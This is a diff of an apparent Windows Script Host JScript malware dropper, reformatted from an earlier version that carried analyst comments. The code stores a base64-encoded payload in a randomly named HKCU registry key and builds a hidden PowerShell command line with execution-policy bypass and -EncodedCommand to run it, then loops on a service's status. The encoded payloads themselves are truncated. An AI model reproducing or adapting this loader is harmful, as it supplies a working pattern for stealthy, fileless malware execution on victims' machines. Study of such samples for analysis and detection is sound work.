@@ -1,44 +1,46 @@
-function getServiceStatus(name) {
-  var dhplxkkouq = GetObject("winmgmts:").ExecQuery(
-    "SELECT * FROM Win32_Service WHERE Name='" + name + "'"
+"use strict";
+/**
+ * @param {string} callback
+ * @return {?}
+ */
+function getServiceStatus(callback) {
+  var obj = GetObject("winmgmts:").ExecQuery(
+    "SELECT * FROM Win32_Service WHERE Name='" + callback + "'"
   );
-  akpcrf = new Enumerator(dhplxkkouq);
+  akpcrf = new Enumerator(obj);
   zmubfuo = akpcrf.item();
-  var vguavnyxlp = "";
+  /** @type {string} */
+  var statusProperty = "";
   try {
-    vguavnyxlp = zmubfuo.State;
+    statusProperty = zmubfuo.State;
   } catch (e) {}
-  if (vguavnyxlp == "Running") {
+  if (statusProperty == "Running") {
     return true;
   } else {
     return false;
   }
 }
-
 var shellObject = WScript.CreateObject("shell.application");
 var wScriptObject = new ActiveXObject("WScript.Shell");
 var mtvunslh = GetObject("winmgmts:\\\\.\\root\\CIMV2");
 var hewjay = mtvunslh.ExecQuery(
   "SELECT * FROM Win32_OperatingSystem",
   "WQL",
-  0x10 | 0x20
+  16 | 32
 );
 var yhqpykwg = new Enumerator(hewjay);
 var yjiofgrdfx = yhqpykwg.item();
 var systemDirectoryPath = yjiofgrdfx.SystemDirectory;
 var daiofhmsnh = yjiofgrdfx.Version;
 var arr = daiofhmsnh.split(".");
-
-// base64 encoded unicode string
-var zrynfhnwsub = "";
-
+/** @type {string} */
+var zrynfhnwsub = "QQBk...H0A";
 wScriptObject.RegWrite(
   "HKEY_CURRENT_USER\\Software\\capvzgf\\cazysa",
   zrynfhnwsub,
   "REG_SZ"
 );
-// long unicode encoded strings when decoded looks like below
-// (Get-ItemProperty -path 'HKCU:\SOFTWARE\capvzgf').cazysa
+/** @type {string} */
 var djziapwzi =
   systemDirectoryPath +
   "\\WindowsPowerShell\\v1.0\\powershell.exe -nologo -noprofile -ExecutionPolicy ByPass -w hidden -EncodedCommand WwB.....AA==";
@@ -84,14 +86,15 @@ if (arr[0] == "10") {
     );
   }
 }
-
+/** @type {number} */
 var iii = 0;
-while (true) {
+for (; true; ) {
   if (getServiceStatus(swmzra)) {
     WScript.sleep(100);
   } else {
     break;
   }
+  /** @type {number} */
   iii = iii + 1;
   if (iii == 600) {
     break;
